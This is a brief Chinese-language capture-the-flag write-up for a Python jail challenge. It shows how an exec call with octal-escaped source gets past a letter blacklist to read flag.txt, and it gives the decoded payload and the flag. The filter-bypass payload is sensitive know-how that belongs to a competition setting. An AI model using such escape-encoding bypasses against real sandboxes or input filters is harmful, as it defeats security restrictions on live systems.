# BYUCTF 2023 - NOPQRSTUVWXYZ

## 题目简述

服务允许输入开头四个字符保留字母 `n` 至 `z`，随后删除这些字母，并限制总长度。flag 仍位于 `flag.txt`，关键是让过滤后的源码在运行时重新生成被删字符。

## 解题过程

用允许出现在开头的 `exec` 启动第二层代码，并把内层源码写成八进制转义：

```python
exec("\160\162\151\156\164\050\157\160\145\156\050\047\146\154\141\147\056\164\170\164\047\051\056\162\145\141\144\050\051\051")
```

八进制序列解码后是：

```python
print(open('flag.txt').read())
```

由此得到：

```text
byuctf{1_l0v3_c0nnected_ch4llz}
```

## 方法总结

当 jail 允许字符串字面量和二次执行时，字母黑名单通常会被十六进制、八进制或 Unicode 转义击穿。分析时应逐层写出“过滤前文本、过滤后文本、字符串解码结果、最终执行代码”，避免混淆各阶段。
